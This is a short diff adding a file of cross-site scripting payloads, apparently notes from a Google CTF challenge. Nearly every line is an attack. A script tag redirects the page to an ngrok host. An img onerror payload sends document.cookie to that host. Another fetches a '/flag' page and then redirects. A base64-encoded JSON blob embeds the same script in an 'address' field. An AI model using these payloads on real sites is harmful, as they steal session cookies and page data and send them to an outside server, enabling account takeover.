@@ -1,0 +1,11 @@
+<script>
+function test() { 
+document.location="http://b274d81061cc.ngrok.io/GoogleCTF/test.txt"; 
+}
+ </script>
+
+
+<img src="x", onerror="document.location='https://b274d81061cc.ngrok.io/GoogleCTF/test.txt?c='+document.cookie;">
+<img src="x", onerror="xmlhttp=new XMLHttpRequest();xmlhttp.open('GET','https://typeselfsub.web.ctfcompetition.com/flag',false);xmlhttp.send();document.location='http://b274d81061cc.ngrok.io/GoogleCTF/test.txt?c=test';">
+
+JSON.parse(atob("eyJjc3JmIjoiZGMzMDk4ZDYtMDBmYS00NjdkLTk3MjQtMmI0YTVkN2U3ZGI4IiwidXNlcm5hbWUiOiJ0ZXN0MzU3IiwiYWRkcmVzcyI6IjxzY3JpcHQ+ZnVuY3Rpb24gdGVzdCgpIHsgZG9jdW1lbnQubG9jYXRpb249XCJodHRwOi8vYjI3NGQ4MTA2MWNjLm5ncm9rLmlvL0dvb2dsZUNURi90ZXN0LnR4dFwiOyB9IDwvc2NyaXB0PiIsImZsYWciOiI8c3BhbiBjbGFzcz10ZXh0LWRhbmdlcj5Pbmx5IHRoZSBjaGF0IHVzZXIncyBhY2NvdW50IGhhcyBmbGFnPC9zcGFuPiJ9"))['address']
